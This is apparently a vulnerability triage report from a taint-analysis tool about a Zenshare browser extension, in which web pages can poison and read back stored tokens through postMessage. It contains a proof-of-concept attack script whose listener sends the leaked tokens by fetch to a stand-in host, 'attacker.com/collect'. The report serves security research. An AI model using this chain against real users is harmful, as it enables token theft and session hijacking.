# CoCo Analysis: pomckcogeffbfailipjnpmijpjedakmp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (chrome_storage_local_set_sink with retrieval path)

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pomckcogeffbfailipjnpmijpjedakmp/opgen_generated_files/cs_0.js
Line 1694: addEventListener("message",(function(e){var t=e.data;browser.runtime.sendMessage(t)}))

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pomckcogeffbfailipjnpmijpjedakmp/opgen_generated_files/bg.js
Line 2192: browser.storage.local.set({tokens:t.tokens})

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 1694)
addEventListener("message",(function(e){
  var t=e.data;  // ← attacker-controlled via postMessage
  browser.runtime.sendMessage(t);  // ← forward to background
}))

// Content script - Storage read and leak (cs_0.js Line 1694)
browser.storage.local.get().then((function(e){
  var t=(void 0===e?{}:e).tokens,
  n=Array.isArray(t)?t:[];
  postMessage({zenExtension:{installed:!0,tokens:n}},"*");  // ← leak tokens to webpage
}))

// Background script - Message handler (bg.js Line 2192)
browser.runtime.onMessage.addListener((function(e){
  var n=this,
  t=e.zenWebapp;  // ← attacker-controlled data
  t&&r(n,void 0,void 0,(function(){
    return o(this,(function(e){
      switch(e.label){
        case 0:
          return[4,browser.storage.local.set({tokens:t.tokens})];  // ← storage poisoning
        case 1:
          return e.sent(),
                 browser.tabs.remove(i.map((function(e){return e.id}))),
                 i=[],
                 browser.tabs.create({}),[2]
      }
    }))
  }))
}))
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// From malicious webpage at https://web.zenshare.app/* (matches content_scripts)
// Step 1: Poison storage with malicious tokens
window.postMessage({
  zenWebapp: {
    tokens: ["attacker-token-1", "attacker-token-2", "malicious-payload"]
  }
}, "*");

// Step 2: Trigger storage read to retrieve poisoned data
// The content script automatically reads storage on load and posts it back:
// browser.storage.local.get().then(...postMessage({zenExtension:{installed:true,tokens:n}},"*"))

// Step 3: Listen for leaked tokens
window.addEventListener("message", function(event) {
  if (event.data.zenExtension) {
    console.log("Stolen tokens:", event.data.zenExtension.tokens);
    // Exfiltrate to attacker server
    fetch("https://attacker.com/collect", {
      method: "POST",
      body: JSON.stringify(event.data.zenExtension.tokens)
    });
  }
});
```

**Impact:** Complete storage exploitation chain allowing attacker to poison storage with malicious tokens and retrieve stored tokens back through postMessage. Attacker can steal legitimate user tokens or inject malicious tokens that may be used in authenticated requests to the Zenshare backend.
